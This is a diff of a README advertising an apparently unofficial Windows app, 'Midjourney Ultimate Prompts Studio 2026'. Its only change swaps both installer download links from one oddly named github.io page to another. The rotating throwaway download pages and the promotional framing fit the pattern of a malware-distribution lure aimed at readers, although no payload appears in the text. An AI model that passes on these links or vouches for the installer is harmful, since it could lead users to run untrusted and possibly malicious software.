@@ -2,7 +2,7 @@
 
 This comprehensive Windows desktop application is designed to supercharge your Midjourney experience. Midjourney Ultimate Prompts Studio 2026 provides a dedicated interface for crafting, organizing, and batch-executing complex prompts, helping you generate high-quality AI art with unprecedented speed and control. Say goodbye to endless chat scrolling and hello to a streamlined, professional creative workflow.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -57,6 +57,6 @@ Yes! Version 15.07 and later includes an import feature that supports plain text
 
 For the latest version and all future updates, please visit our official download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 *Last Updated: October 26, 2026*
